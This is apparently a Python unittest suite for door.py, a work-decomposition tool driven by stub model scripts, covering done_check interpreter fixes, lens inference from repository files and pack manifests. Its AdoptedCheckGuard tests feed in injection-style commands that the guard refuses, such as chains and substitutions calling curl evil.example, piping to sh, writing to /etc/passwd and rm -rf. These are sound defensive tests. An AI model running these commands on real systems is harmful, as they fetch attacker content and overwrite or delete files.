"""door.py, driven as the real command line, with a stub standing in for the
model. No network, no real claude invocation: each case writes its own
decomposer script into a tempdir and points --model-cmd at it, the same way
test_spine.py stands in a fake worker for the real one.
"""
import contextlib
import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
DOOR = os.path.join(HERE, "door.py")
import door as door_mod  # noqa: E402

# E100: one sandbox for every temp tree this process makes, removed at exit.
import os as _e100_os, sys as _e100_sys  # noqa: E402
_e100_sys.path.append(_e100_os.path.join(
    _e100_os.path.dirname(_e100_os.path.abspath(__file__)), '.'))
try:  # noqa: E402
    import tmp_sandbox as _e100_tmp
    _e100_tmp.install()
except ImportError:
    # A packager (scripts/export_public.py, make_benchmark_bundle.py)
    # can copy this test without scripts/tmp_sandbox.py beside it. Say
    # so rather than dying: the sandbox is hygiene, not the subject.
    _e100_sys.stderr.write(
        "tmp_sandbox absent: %s leaves its temp trees behind\n"
        % _e100_os.path.basename(__file__))


class DoneCheckInterpreter(unittest.TestCase):
    """The harsh EVAD 2026-08-31 killer: a generated done_check named `python`
    on a machine that has only python3, so every check exited 127."""

    def test_python_is_resolved_to_python3_when_only_python3_exists(self):
        import shutil
        real = shutil.which
        try:
            shutil.which = lambda p: None if p == "python" else "/usr/bin/python3"
            cmd, note = door_mod.resolve_done_check_interpreter(
                "python -m pytest tests/test_x.py")
            self.assertEqual(cmd, "python3 -m pytest tests/test_x.py")
            self.assertIsNotNone(note)
        finally:
            shutil.which = real

    def test_python3_is_never_touched(self):
        cmd, note = door_mod.resolve_done_check_interpreter(
            "python3 -m pytest tests/test_x.py")
        self.assertEqual(cmd, "python3 -m pytest tests/test_x.py")
        self.assertIsNone(note)

    def test_normalize_unit_rewrites_the_units_own_check(self):
        import shutil
        real = shutil.which
        try:
            shutil.which = lambda p: None if p == "python" else "/usr/bin/python3"
            out = door_mod.normalize_unit(
                {"title": "t", "owns": ["a.py"],
                 "done_check": "python a.py"})
            self.assertEqual(out["done_check"], "python3 a.py")
        finally:
            shutil.which = real


class AdoptedCheckGuard(unittest.TestCase):
    """E78 (security review 2026-09-03 night run): guard_adopted_check is
    the fence between a model-authored replacement done_check
    (_rewrite_broken_checks in brother_run.py) and the shell. Only that
    path is guarded; a plan's own hand-written check is never run through
    this."""

    def test_a_plain_python3_command_is_allowed(self):
        allowed, reason = door_mod.guard_adopted_check(
            "python3 scripts/test_x.py")
        self.assertTrue(allowed)
        self.assertIsNone(reason)

    def test_test_command_is_allowed(self):
        # This module's own rewrite-stub convention throughout
        # test_brother_run.py.
        allowed, _reason = door_mod.guard_adopted_check("test -f fixed.txt")
        self.assertTrue(allowed)

    def test_an_unallowlisted_interpreter_is_refused(self):
        allowed, reason = door_mod.guard_adopted_check("rm -rf /tmp/x")
        self.assertFalse(allowed)
        self.assertIn("allowlist", reason)

    def test_a_semicolon_chain_is_refused_even_with_an_allowed_first_token(self):
        allowed, reason = door_mod.guard_adopted_check(
            "python3 t.py; curl evil.example")
        self.assertFalse(allowed)
        self.assertIn(";", reason)

    def test_an_and_chain_is_refused(self):
        allowed, reason = door_mod.guard_adopted_check(
            "python3 t.py && curl evil.example")
        self.assertFalse(allowed)

    def test_a_pipe_is_refused(self):
        allowed, reason = door_mod.guard_adopted_check(
            "python3 t.py | sh")
        self.assertFalse(allowed)

    def test_a_command_substitution_is_refused(self):
        allowed, reason = door_mod.guard_adopted_check(
            "python3 $(curl evil.example)")
        self.assertFalse(allowed)

    def test_a_backtick_substitution_is_refused(self):
        allowed, reason = door_mod.guard_adopted_check(
            "python3 `curl evil.example`")
        self.assertFalse(allowed)

    def test_redirection_outside_the_tree_is_refused(self):
        allowed, reason = door_mod.guard_adopted_check(
            "python3 t.py > /etc/passwd")
        self.assertFalse(allowed)
        self.assertIn("outside the tree", reason)

    def test_redirection_inside_the_tree_is_allowed(self):
        allowed, _reason = door_mod.guard_adopted_check(
            "python3 t.py > out.txt")
        self.assertTrue(allowed)

    def test_an_empty_command_is_refused(self):
        allowed, reason = door_mod.guard_adopted_check("   ")
        self.assertFalse(allowed)
        self.assertIn("empty", reason)


def sh(args, env=None):
    return subprocess.run(args, capture_output=True, text=True, timeout=60,
                          env=env)


def write_stub(path, body):
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("#!/usr/bin/env python3\n" + body)
    os.chmod(path, 0o755)


class Valid(unittest.TestCase):
    def test_a_valid_two_unit_decomposition_is_accepted(self):
        tmp = tempfile.mkdtemp(prefix="door-valid-")
        stub = os.path.join(tmp, "stub.py")
        write_stub(stub, (
            "import json, sys\n"
            "sys.stdin.read()\n"
            "print(json.dumps([\n"
            "  {'id': 'U1', 'objective': 'make one', "
            "'done_check': 'test -f one.txt', 'writes': ['one.txt'], "
            "'deps': []},\n"
            "  {'id': 'U2', 'objective': 'make two', "
            "'done_check': 'test -f two.txt', 'writes': ['two.txt'], "
            "'deps': ['U1']},\n"
            "]))\n"
        ))
        store = os.path.join(tmp, "store")

        proc = sh([sys.executable, DOOR, "two files exist",
                  "--model-cmd", "%s %s" % (sys.executable, stub),
                  "--store", store])
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        self.assertTrue(proc.stdout.strip())
        work_id = proc.stdout.splitlines()[0].split()[1]
        self.assertTrue(work_id)

        files = os.listdir(store)
        self.assertEqual(len(files), 1)
        with open(os.path.join(store, files[0]), encoding="utf-8") as fh:
            record = json.load(fh)
        ids = {r["id"] for r in record["rows"]}
        self.assertEqual(ids, {"U1", "U2"})


class Retry(unittest.TestCase):
    def test_a_refused_answer_is_retried_with_the_refusal_text(self):
        tmp = tempfile.mkdtemp(prefix="door-retry-")
        stub = os.path.join(tmp, "stub.py")
        counter = os.path.join(tmp, "count")
        stdin2 = os.path.join(tmp, "stdin2.txt")
        write_stub(stub, (
            "import json, os, sys\n"
            "counter = %r\n"
            "stdin2 = %r\n"
            "n = 0\n"
            "if os.path.exists(counter):\n"
            "    n = int(open(counter).read() or '0')\n"
            "n += 1\n"
            "open(counter, 'w').write(str(n))\n"
            "stdin_text = sys.stdin.read()\n"
            "if n == 1:\n"
            "    units = [\n"
            "        {'id': 'U1', 'objective': 'make one', 'done_check': '', "
            "'writes': ['one.txt'], 'deps': []},\n"
            "        {'id': 'U2', 'objective': 'make two', "
            "'done_check': 'test -f two.txt', 'writes': ['two.txt'], "
            "'deps': ['U1']},\n"
            "    ]\n"
            "else:\n"
            "    open(stdin2, 'w').write(stdin_text)\n"
            "    units = [\n"
            "        {'id': 'U1', 'objective': 'make one', "
            "'done_check': 'test -f one.txt', 'writes': ['one.txt'], "
            "'deps': []},\n"
            "        {'id': 'U2', 'objective': 'make two', "
            "'done_check': 'test -f two.txt', 'writes': ['two.txt'], "
            "'deps': ['U1']},\n"
            "    ]\n"
            "print(json.dumps(units))\n"
        ) % (counter, stdin2))
        store = os.path.join(tmp, "store")

        proc = sh([sys.executable, DOOR, "two files exist",
                  "--model-cmd", "%s %s" % (sys.executable, stub),
                  "--store", store])
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        with open(counter, encoding="utf-8") as fh:
            self.assertEqual(fh.read().strip(), "2")
        self.assertTrue(os.path.exists(stdin2))
        with open(stdin2, encoding="utf-8") as fh:
            second_stdin = fh.read()
        self.assertIn("no done_check", second_stdin)
        self.assertIn("U1", second_stdin)


class Refused(unittest.TestCase):
    def test_a_cyclic_decomposition_is_refused_and_nothing_is_stored(self):
        tmp = tempfile.mkdtemp(prefix="door-cyclic-")
        stub = os.path.join(tmp, "stub.py")
        write_stub(stub, (
            "import json, sys\n"
            "sys.stdin.read()\n"
            "print(json.dumps([\n"
            "  {'id': 'A', 'objective': 'a', 'done_check': 'true', "
            "'writes': ['a.txt'], 'deps': ['B']},\n"
            "  {'id': 'B', 'objective': 'b', 'done_check': 'true', "
            "'writes': ['b.txt'], 'deps': ['A']},\n"
            "]))\n"
        ))
        store = os.path.join(tmp, "store")

        proc = sh([sys.executable, DOOR, "a cycle nobody can schedule",
                  "--model-cmd", "%s %s" % (sys.executable, stub),
                  "--store", store])
        self.assertNotEqual(proc.returncode, 0)
        self.assertFalse(os.path.exists(store))
        self.assertIn("cycle", proc.stdout + proc.stderr)


class NoData(unittest.TestCase):
    def test_a_missing_decomposer_is_NO_DATA_not_a_crash(self):
        tmp = tempfile.mkdtemp(prefix="door-nodata-")
        store = os.path.join(tmp, "store")
        env = dict(os.environ)
        env["DOOR_MODEL_CMD"] = "/no/such/decomposer --flag"

        proc = sh([sys.executable, DOOR, "an outcome", "--store", store],
                  env=env)
        self.assertEqual(proc.returncode, 44, proc.stdout + proc.stderr)
        self.assertTrue(any(l.startswith("NO-DATA")
                            for l in (proc.stdout + proc.stderr).splitlines()))
        self.assertFalse(os.path.exists(store))


class PackManifests(unittest.TestCase):
    """P2 (persona integration): scripts/packs/core.json and
    scripts/packs/data-science.json are the pack manifests as data; door.py
    only loads and validates them in this row, nothing wires them into a
    prompt yet.

    The list is no longer pinned to those two names. Eleven persona packs
    landed beside them, and a test that names its population fails on every
    pack a later lane adds while saying nothing about the pack that was
    added: what this holds is that the two packs it reasons about are
    present and that pack_manifests validated whatever else is installed.
    Every pack's own contract is scripts/test_packs.py, which enumerates
    the directory rather than naming it."""

    def test_pack_manifests_carry_every_required_key(self):
        manifests = door_mod.pack_manifests()
        for expected in ("core", "data-science"):
            self.assertIn(expected, manifests)
        for name, manifest in manifests.items():
            for key in door_mod.PACK_REQUIRED_KEYS:
                self.assertIn(key, manifest,
                              "%s is missing %r" % (name, key))
        self.assertEqual(
            manifests["data-science"]["challenge_question"],
            "What is the pre-registered success metric and "
            "holdout/evaluation rule?")
        self.assertEqual(
            sorted(manifests["data-science"]["required_evidence_families"]),
            ["E18", "E2", "E8"])

    def test_a_manifest_missing_a_key_is_refused_by_name(self):
        tmp = tempfile.mkdtemp(prefix="door-pack-")
        good = door_mod.load_pack("core")
        broken = dict(good)
        del broken["forcing_classes"]
        del broken["challenge_question"]
        with open(os.path.join(tmp, "broken.json"), "w", encoding="utf-8") as fh:
            json.dump(broken, fh)

        with self.assertRaises(ValueError) as ctx:
            door_mod.load_pack("broken", packs_dir=tmp)
        message = str(ctx.exception)
        self.assertIn("forcing_classes", message)
        self.assertIn("challenge_question", message)

    def test_a_missing_pack_file_is_refused_by_name(self):
        tmp = tempfile.mkdtemp(prefix="door-pack-missing-")
        with self.assertRaises(ValueError) as ctx:
            door_mod.load_pack("no-such-lens", packs_dir=tmp)
        self.assertIn("no-such-lens", str(ctx.exception))

    def test_an_unreadable_manifest_is_skipped_and_named_on_stderr(self):
        """silent-failure-lints hit at scripts/door.py:160 (pre-fix): a bare
        `except OSError: continue` dropped which manifest failed to read
        and why. A listed path that does not exist on disk (deleted between
        list_repo_files and this read, or simply unreachable) is the
        reliable, permission-independent way to hit OSError here."""
        tmp = tempfile.mkdtemp(prefix="door-manifest-unreadable-")
        buf = io.StringIO()
        with contextlib.redirect_stderr(buf):
            hit = door_mod._manifest_string_hit(
                tmp, ["requirements.txt"], "mlflow")
        self.assertIsNone(hit)
        stderr = buf.getvalue()
        self.assertIn("requirements.txt", stderr)
        self.assertIn("skipped", stderr)


class PathSignalMatching(unittest.TestCase):
    """_path_matches_signal: the two signal shapes a pack manifest carries
    (persona doc 3.3). A '/'-suffixed signal is a directory name at any
    depth; anything else is an fnmatch against the basename."""

    def test_a_glob_signal_matches_a_notebook_at_any_depth(self):
        self.assertTrue(door_mod._path_matches_signal("a.ipynb", "*.ipynb"))
        self.assertTrue(door_mod._path_matches_signal(
            "notebooks/deep/a.ipynb", "*.ipynb"))
        self.assertFalse(door_mod._path_matches_signal("a.py", "*.ipynb"))

    def test_a_bare_filename_signal_matches_at_any_depth(self):
        self.assertTrue(door_mod._path_matches_signal(
            "dvc.yaml", "dvc.yaml"))
        self.assertTrue(door_mod._path_matches_signal(
            "sub/dvc.yaml", "dvc.yaml"))

    def test_a_directory_signal_matches_a_file_under_it_at_any_depth(self):
        self.assertTrue(door_mod._path_matches_signal(
            "mlruns/0/meta.yaml", "mlruns/"))
        self.assertTrue(door_mod._path_matches_signal(
            "sub/mlruns/0/meta.yaml", "mlruns/"))
        self.assertFalse(door_mod._path_matches_signal(
            "notmlruns/x.txt", "mlruns/"))


class LensInference(unittest.TestCase):
    """P3 (persona integration): infer_lens matches list_repo_files output
    against every pack's own detection_signals (persona doc 3.3: 'Infer
    from repository/work and let the human correct the inference')."""

    def test_ipynb_and_mlruns_infer_data_science(self):
        tmp = tempfile.mkdtemp(prefix="door-infer-ds-")
        listed = ["a.ipynb", "b.ipynb", "mlruns/0/meta.yaml", "README.md"]
        lens, matched = door_mod.infer_lens(tmp, listed)
        self.assertEqual(lens, "data-science")
        self.assertIn("a.ipynb", matched)
        self.assertIn("b.ipynb", matched)
        self.assertIn("mlruns/0/meta.yaml", matched)
        self.assertNotIn("README.md", matched)

    def test_a_plain_tree_infers_no_lens(self):
        lens, matched = door_mod.infer_lens(
            "/does/not/matter", ["README.md", "src/main.py"])
        self.assertIsNone(lens)
        self.assertEqual(matched, [])

    def test_a_manifest_string_hit_infers_the_lens_with_no_paths(self):
        tmp = tempfile.mkdtemp(prefix="door-infer-manifest-")
        with open(os.path.join(tmp, "requirements.txt"), "w",
                 encoding="utf-8") as fh:
            fh.write("mlflow==2.0\nnumpy\n")
        lens, matched = door_mod.infer_lens(tmp, ["requirements.txt"])
        self.assertEqual(lens, "data-science")
        self.assertEqual(matched, ["requirements.txt"])

    def test_an_unreadable_packs_dir_infers_no_lens(self):
        """silent-failure-lints hit at scripts/door.py:181 (pre-fix): a bare
        `except ValueError: return None, []` dropped why pack_manifests
        failed. The reason must now name the broken packs_dir on stderr."""
        buf = io.StringIO()
        with contextlib.redirect_stderr(buf):
            lens, matched = door_mod.infer_lens(
                "/does/not/matter", ["a.ipynb"], packs_dir="/no/such/dir")
        self.assertIsNone(lens)
        self.assertEqual(matched, [])
        self.assertIn("/no/such/dir", buf.getvalue())


def _two_pack_dir(case):
    """A packs directory holding core, data-science and a second
    signal-bearing pack, for driving compositional selection. The second
    pack is a real copy of data-science with its own lens name, one
    detection signal ('*.sql', which data-science does not carry), its
    own challenge question,
    receipt fields and evidence families, so a tree can match BOTH packs
    and the composition is visible in what comes back. Returns the
    directory path; the caller's tempdir is cleaned up by addCleanup."""
    tmp = tempfile.mkdtemp(prefix="door-compose-")
    case.addCleanup(shutil.rmtree, tmp, ignore_errors=True)
    packs = os.path.join(tmp, "packs")
    os.makedirs(packs)
    for name in ("core", "data-science"):
        with open(os.path.join(door_mod.PACKS_DIR, "%s.json" % name),
                 encoding="utf-8") as fh:
            pack = json.load(fh)
        with open(os.path.join(packs, "%s.json" % name), "w",
                 encoding="utf-8") as fh:
            json.dump(pack, fh)
    second = dict(pack)  # the data-science manifest just read
    second["lens"] = "data-engineering"
    second["detection_signals"] = {"paths": ["*.sql"],
                                   "manifest_strings": []}
    second["challenge_question"] = ("Which system of record is this grain "
                                    "reconciled against?")
    second["receipt_fields"] = ["grain", "reconciliation"]
    second["required_evidence_families"] = ["E2", "E9"]
    second["forcing_classes"] = [
        {"id": "backfill", "label": "Backfill", "why": "a historical "
         "rewrite of an already-published table"}]
    with open(os.path.join(packs, "data-engineering.json"), "w",
             encoding="utf-8") as fh:
        json.dump(second, fh)
    return tmp, packs


class CompositionalLensSelection(unittest.TestCase):
    """Persona doc 5.2, "Pack selection must be compositional". BEFORE this
    row infer_lens returned the FIRST pack in sorted lens-name order, so a
    tree that is both data engineering and data science got exactly one
    lens (and with thirteen packs installed, "architect" would win every
    tree it matched). These cases fail against that behaviour: the first
    asserts BOTH packs come back, which a single-lens return cannot do."""

    def test_a_tree_matching_two_packs_returns_both_ordered(self):
        tmp, packs = _two_pack_dir(self)
        listed = ["a.ipynb", "mlruns/0/meta.yaml", "models/revenue.sql"]
        inferred = door_mod.infer_lenses(tmp, listed, packs_dir=packs)
        names = [name for name, _matched in inferred]
        # data-science fired two signals ('*.ipynb' and 'mlruns/'),
        # data-engineering one, so specificity orders them; core is the
        # base and is always last.
        self.assertEqual(names, ["data-science", "data-engineering", "core"])
        matched = dict(inferred)
        self.assertIn("a.ipynb", matched["data-science"])
        self.assertEqual(matched["data-engineering"],
                         ["models/revenue.sql"])
        self.assertEqual(matched["core"], [])

    def test_priority_breaks_a_specificity_tie(self):
        tmp, packs = _two_pack_dir(self)
        path = os.path.join(packs, "data-engineering.json")
        with open(path, encoding="utf-8") as fh:
            pack = json.load(fh)
        pack["priority"] = 5
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(pack, fh)
        # one signal each: only `priority` can order them, and without it
        # sorted lens-name order would put data-engineering first anyway,
        # so the tie is proven the other way round below.
        inferred = door_mod.infer_lenses(
            tmp, ["a.ipynb", "models/revenue.sql"], packs_dir=packs)
        self.assertEqual([n for n, _m in inferred],
                         ["data-engineering", "data-science", "core"])
        pack["priority"] = -5
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(pack, fh)
        inferred = door_mod.infer_lenses(
            tmp, ["a.ipynb", "models/revenue.sql"], packs_dir=packs)
        self.assertEqual([n for n, _m in inferred],
                         ["data-science", "data-engineering", "core"])

    def test_the_single_lens_accessor_is_the_most_specific_pack(self):
        tmp, packs = _two_pack_dir(self)
        lens, matched = door_mod.infer_lens(
            tmp, ["a.ipynb", "mlruns/0/meta.yaml", "models/revenue.sql"],
            packs_dir=packs)
        self.assertEqual(lens, "data-science")
        self.assertIn("mlruns/0/meta.yaml", matched)

    def test_an_unmatched_tree_composes_nothing_not_even_core(self):
        tmp, packs = _two_pack_dir(self)
        self.assertEqual(
            door_mod.infer_lenses(tmp, ["README.md"], packs_dir=packs), [])
        self.assertEqual(
            door_mod.infer_lens(tmp, ["README.md"], packs_dir=packs),
            (None, []))

    def test_the_assumption_line_names_every_inferred_lens(self):
        tmp, packs = _two_pack_dir(self)
        line = door_mod.lenses_assumption_line(door_mod.infer_lenses(
            tmp, ["a.ipynb", "models/revenue.sql"], packs_dir=packs))
        self.assertIn("data-science work (found a.ipynb)", line)
        self.assertIn("data-engineering work (found models/revenue.sql)",
                      line)
        self.assertNotIn("core", line)
        self.assertIn("say otherwise to change it", line)

    def test_the_union_is_every_composed_pack_s_fields(self):
        tmp, packs = _two_pack_dir(self)
        names = [n for n, _m in door_mod.infer_lenses(
            tmp, ["a.ipynb", "models/revenue.sql"], packs_dir=packs)]
        union = door_mod.pack_union(names, packs_dir=packs)
        self.assertIn("grain", union["receipt_fields"])
        self.assertIn("split_identity", union["receipt_fields"])
        self.assertIn("harness_revision", union["receipt_fields"])
        self.assertEqual(union["required_evidence_families"][0], "E2")
        self.assertEqual(len(union["required_evidence_families"]),
                         len(set(union["required_evidence_families"])))
        for family in ("E2", "E8", "E18", "E9", "E1", "E6"):
            self.assertIn(family, union["required_evidence_families"])

    def test_an_unreadable_pack_is_named_and_the_others_still_compose(self):
        tmp, packs = _two_pack_dir(self)
        buf = io.StringIO()
        with contextlib.redirect_stderr(buf):
            union = door_mod.pack_union(["no-such-lens", "core"],
                                        packs_dir=packs)
        self.assertIn("no-such-lens", buf.getvalue())
        self.assertIn("harness_revision", union["receipt_fields"])


class ComposedChallengeQuestions(unittest.TestCase):
    """compute_challenge composes (persona doc 5.2 and 4.2): the most
    specific lens's question first, another pack's only when one of ITS
    forcing classes fires on a unit, the whole list cut to the summed
    question budget capped at QUESTION_BUDGET_CEILING."""

    def _units(self, objective):
        return [{"id": "U1", "objective": objective, "done_check": "true",
                 "owns": []}]

    def test_the_primary_question_alone_when_no_other_class_fires(self):
        tmp, packs = _two_pack_dir(self)
        assumption, pending = door_mod.compute_challenge(
            tmp, [], ["data-science", "data-engineering", "core"],
            self._units("promote the new model to production"),
            packs_dir=packs)
        self.assertIsNone(assumption)
        self.assertEqual(pending["lens"], "data-science")
        self.assertEqual([q["lens"] for q in pending["questions"]],
                         ["data-science"])

    def test_a_second_pack_earns_a_question_when_its_class_fires(self):
        tmp, packs = _two_pack_dir(self)
        assumption, pending = door_mod.compute_challenge(
            tmp, [], ["data-science", "data-engineering", "core"],
            self._units("promote the new model after the backfill of the "
                        "published revenue table"),
            packs_dir=packs)
        self.assertIsNone(assumption)
        self.assertEqual([q["lens"] for q in pending["questions"]],
                         ["data-science", "data-engineering"])
        # the P5 shape is unchanged for every reader that wants one
        # question: the primary lens and its question, at the top level.
        self.assertEqual(pending["lens"], "data-science")
        self.assertIn("pre-registered", pending["question"])

    def test_the_composed_list_never_exceeds_the_4_2_ceiling(self):
        self.assertEqual(door_mod.QUESTION_BUDGET_CEILING, 6)
        tmp, packs = _two_pack_dir(self)
        for name in ("data-engineering",):
            path = os.path.join(packs, "%s.json" % name)
            with open(path, encoding="utf-8") as fh:
                pack = json.load(fh)
            pack["question_budget"] = {"min": 0, "max": 0}
            with open(path, "w", encoding="utf-8") as fh:
                json.dump(pack, fh)
        # data-science's own max is 4, data-engineering's is now 0: the sum
        # is 4, still above the one question composed here, so the cut is
        # proven by the ceiling constant and by the list staying inside it.
        _assumption, pending = door_mod.compute_challenge(
            tmp, [], ["data-science", "data-engineering"],
            self._units("promote the model after the backfill"),
            packs_dir=packs)
        self.assertLessEqual(len(pending["questions"]),
                             door_mod.QUESTION_BUDGET_CEILING)

    def test_a_single_lens_name_still_works_unchanged(self):
        tmp, packs = _two_pack_dir(self)
        _assumption, pending = door_mod.compute_challenge(
            tmp, [], "data-science",
            self._units("promote the new model"), packs_dir=packs)
        self.assertEqual(pending["lens"], "data-science")


class LensAssumptionLine(unittest.TestCase):
    """The intent screen's own assumption line (P3 what_they_see): 'Assumed:
    <lens> work (found <paths>); say otherwise to change it', capped at
    MAX_ASSUMPTION_PATHS names."""

    def test_no_lens_is_the_empty_line(self):
        self.assertEqual(door_mod.lens_assumption_line(None, []), "")
        self.assertEqual(door_mod.lens_assumption_line("data-science", []), "")

    def test_the_line_names_the_lens_and_the_matched_paths(self):
        line = door_mod.lens_assumption_line(
            "data-science", ["a.ipynb", "b.ipynb"])
        self.assertIn("Assumed: data-science work", line)
        self.assertIn("a.ipynb, b.ipynb", line)
        self.assertIn("say otherwise to change it", line)

    def test_a_long_match_list_is_capped_with_a_count(self):
        line = door_mod.lens_assumption_line(
            "data-science", ["a.ipynb", "b.ipynb", "c.ipynb", "d.ipynb"])
        self.assertIn("and 1 more", line)
        self.assertNotIn("d.ipynb", line)


class ChallengeSwallows(unittest.TestCase):
    """P5's two error paths (find_metric_in_tree, compute_challenge), the
    other half of the door.py silent-failure-lints hits: an unreadable
    README or a broken pack must be named on stderr, not just dropped."""

    def test_an_unreadable_readme_is_skipped_and_named_on_stderr(self):
        """silent-failure-lints hit at scripts/door.py:284 (pre-fix): a bare
        `except OSError: continue` dropped which README failed to read.
        A directory named like a README is a reliable, permission-
        independent way to make open() raise OSError here."""
        tmp = tempfile.mkdtemp(prefix="door-metric-readme-")
        os.mkdir(os.path.join(tmp, "README.md"))
        buf = io.StringIO()
        with contextlib.redirect_stderr(buf):
            hit = door_mod.find_metric_in_tree(tmp, ["README.md"])
        self.assertIsNone(hit)
        stderr = buf.getvalue()
        self.assertIn("README.md", stderr)
        self.assertIn("skipped", stderr)

    def test_a_broken_pack_is_named_when_computing_the_challenge(self):
        """silent-failure-lints hit at scripts/door.py:307 (pre-fix): a bare
        `except ValueError: return None, None` dropped why load_pack
        failed for the inferred lens. The reason must now name the lens
        on stderr."""
        tmp = tempfile.mkdtemp(prefix="door-challenge-broken-")
        buf = io.StringIO()
        with contextlib.redirect_stderr(buf):
            assumption, pending = door_mod.compute_challenge(
                "/does/not/matter", [], "no-such-lens",
                [{"objective": "promote the new model"}], packs_dir=tmp)
        self.assertIsNone(assumption)
        self.assertIsNone(pending)
        self.assertIn("no-such-lens", buf.getvalue())


def _stub_that_writes_one_unit(stub_path):
    write_stub(stub_path, (
        "import json, sys\n"
        "sys.stdin.read()\n"
        "print(json.dumps([\n"
        "  {'id': 'U1', 'objective': 'do it', 'done_check': 'true', "
        "'writes': ['x.txt'], 'deps': []},\n"
        "]))\n"
    ))


class LensInferenceEndToEnd(unittest.TestCase):
    """P3's own done-check: a real door.py run, against a real temp tree,
    stamps lens_inferred on the Work document it writes. `--cwd` is not a
    door.py flag; the target tree is door's own process cwd, exactly as
    run_door() in brother_run.py already invokes it."""

    def _run_door_in(self, repo, outcome="a data science change"):
        stub_tmp = tempfile.mkdtemp(prefix="door-lens-stub-")
        stub = os.path.join(stub_tmp, "stub.py")
        _stub_that_writes_one_unit(stub)
        store = os.path.join(repo, "store")
        proc = subprocess.run(
            [sys.executable, DOOR, outcome,
             "--model-cmd", "%s %s" % (sys.executable, stub),
             "--store", store],
            capture_output=True, text=True, timeout=60, cwd=repo)
        self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
        files = [f for f in os.listdir(store) if f.endswith(".json")]
        self.assertEqual(len(files), 1)
        with open(os.path.join(store, files[0]), encoding="utf-8") as fh:
            return json.load(fh)

    def test_a_tree_with_notebooks_and_mlruns_infers_data_science(self):
        repo = tempfile.mkdtemp(prefix="door-lens-ds-repo-")
        for name in ("a.ipynb", "b.ipynb"):
            with open(os.path.join(repo, name), "w", encoding="utf-8") as fh:
                fh.write("{}")
        os.makedirs(os.path.join(repo, "mlruns", "0"))
        with open(os.path.join(repo, "mlruns", "0", "meta.yaml"), "w",
                 encoding="utf-8") as fh:
            fh.write("run: 0\n")

        record = self._run_door_in(repo)
        self.assertEqual(record["lens_inferred"]["lens"], "data-science")
        matched = record["lens_inferred"]["matched_paths"]
        self.assertTrue(any(p.endswith(".ipynb") for p in matched), matched)
        self.assertTrue(any("mlruns" in p for p in matched), matched)

    def test_a_plain_tree_infers_no_lens(self):
        repo = tempfile.mkdtemp(prefix="door-lens-none-repo-")
        with open(os.path.join(repo, "readme.txt"), "w",
                 encoding="utf-8") as fh:
            fh.write("hello\n")

        record = self._run_door_in(repo)
        self.assertIsNone(record["lens_inferred"])


if __name__ == "__main__":
    unittest.main()
